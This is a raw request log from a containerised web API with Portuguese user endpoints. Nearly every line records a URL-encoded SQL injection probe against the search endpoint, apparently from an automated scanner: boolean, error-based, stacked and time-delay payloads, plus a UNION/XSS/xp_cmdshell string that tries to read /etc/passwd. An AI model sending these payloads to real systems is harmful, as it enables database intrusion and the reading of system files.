api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:58946 - "GET /usuarios%27%29/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/MLQx HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58986 - "GET /usuarios%27/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/utas HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59002 - "GET /usuarios/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/OZhe HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59012 - "POST /usuarios HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:59014 - "POST /usuarios?ZHlt=7165%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:59030 - "POST /usuarios HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:59058 - "GET /usuarios/1 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59076 - "PUT /usuarios/1 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:59082 - "PUT /usuarios/1?tulc=3234%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:59094 - "PUT /usuarios/1 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:59124 - "GET /usuarios/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59148 - "GET /usuarios/busca/?nome=teste&gOGY=4855%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59132 - "GET /usuarios/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59152 - "GET /usuarios/busca/?nome=8501 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59162 - "GET /usuarios/busca/?nome=teste%28%28%22%28..%27%29.%28 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59170 - "GET /usuarios/busca/?nome=teste%27lLjgXW%3C%27%22%3EQjPXHv HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59178 - "GET /usuarios/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59192 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4444%3D9908%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27dSKE%27%3D%27dSKE HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59214 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7170%3D6833%2F%2A%2A%2FAND%2F%2A%2A%2F%27chZq%27%3D%27chZq HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59228 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F5219%3D2777%2F%2A%2A%2FAND%2F%2A%2A%2F%286189%3D6189 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59236 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2740%3D8675 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59208 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7167%3D5706--%2F%2A%2A%2FsTNE HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59242 - "GET /usuarios/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287135%3D7225%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7225%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F5362%29%2F%2A%2A%2FEND%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59248 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%289524%2CCONCAT%280x5c%2C0x717a7a7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%289524%3D9524%2C1%29%29%29%2C0x71707a6b71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27KpHA%27%3D%27KpHA HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59262 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%289524%2CCONCAT%280x5c%2C0x717a7a7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%289524%3D9524%2C1%29%29%29%2C0x71707a6b71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27rXZs%27%3D%27rXZs HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59278 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%289524%2CCONCAT%280x5c%2C0x717a7a7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%289524%3D9524%2C1%29%29%29%2C0x71707a6b71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287725%3D7725 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59288 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%289524%2CCONCAT%280x5c%2C0x717a7a7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%289524%3D9524%2C1%29%29%29%2C0x71707a6b71%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59300 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%289524%2CCONCAT%280x5c%2C0x717a7a7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%289524%3D9524%2C1%29%29%29%2C0x71707a6b71%29%29--%2F%2A%2A%2FztSg HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59312 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1972%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281972%3D1972%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27ibYL%27%3D%27ibYL HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59316 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F1972%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281972%3D1972%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27uCfC%27%3D%27uCfC HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59320 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1972%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281972%3D1972%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%286261%3D6261 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59324 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1972%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281972%3D1972%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59338 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1972%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281972%3D1972%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FbRJf HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59342 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6559%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286559%3D6559%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27RWus%27%3D%27RWus HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59350 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6559%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286559%3D6559%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27Pkep%27%3D%27Pkep HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59346 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6559%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286559%3D6559%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287496%3D7496 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59364 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6559%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286559%3D6559%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59370 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6559%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286559%3D6559%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FsuSZ HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59372 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9582%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289582%3D9582%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27XdXu%27%3D%27XdXu HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59374 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F9582%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289582%3D9582%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27pXmU%27%3D%27pXmU HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59384 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F9582%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289582%3D9582%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288891%3D8891 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59388 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9582%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289582%3D9582%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59396 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9582%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289582%3D9582%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FOCOa HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59404 - "GET /usuarios/busca/?nome=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qzzzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288429%3D8429%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qpzkq%27%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59416 - "GET /usuarios/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59418 - "GET /usuarios/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59424 - "GET /usuarios/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59446 - "GET /usuarios/busca/?nome=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59440 - "GET /usuarios/busca/?nome=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59460 - "GET /usuarios/busca/?nome=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59468 - "GET /usuarios/busca/?nome=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59476 - "GET /usuarios/busca/?nome=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59474 - "GET /usuarios/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2874%29%7C%7CCHR%2884%29%7C%7CCHR%2888%29%7C%7CCHR%2886%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59490 - "GET /usuarios/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2874%29%7C%7CCHR%2884%29%7C%7CCHR%2888%29%7C%7CCHR%2886%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59504 - "GET /usuarios/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2874%29%7C%7CCHR%2884%29%7C%7CCHR%2888%29%7C%7CCHR%2886%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59518 - "GET /usuarios/busca/?nome=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2874%29%7C%7CCHR%2884%29%7C%7CCHR%2888%29%7C%7CCHR%2886%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59522 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F1445%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29uUgy%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27Pcjp%27%3D%27Pcjp HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59528 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F1445%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29uUgy%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27AJpr%27%3D%27AJpr HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59538 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F1445%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29uUgy%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284569%3D4569 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59550 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F1445%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29uUgy%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59556 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F1445%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29uUgy%29--%2F%2A%2A%2FYlwg HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59566 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F3461%3D%28SELECT%2F%2A%2A%2F3461%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27SDMB%27%3D%27SDMB HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59578 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F3461%3D%28SELECT%2F%2A%2A%2F3461%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27Vcjh%27%3D%27Vcjh HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59600 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F3461%3D%28SELECT%2F%2A%2A%2F3461%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288375%3D8375 HTTP/1.1" 200 OK
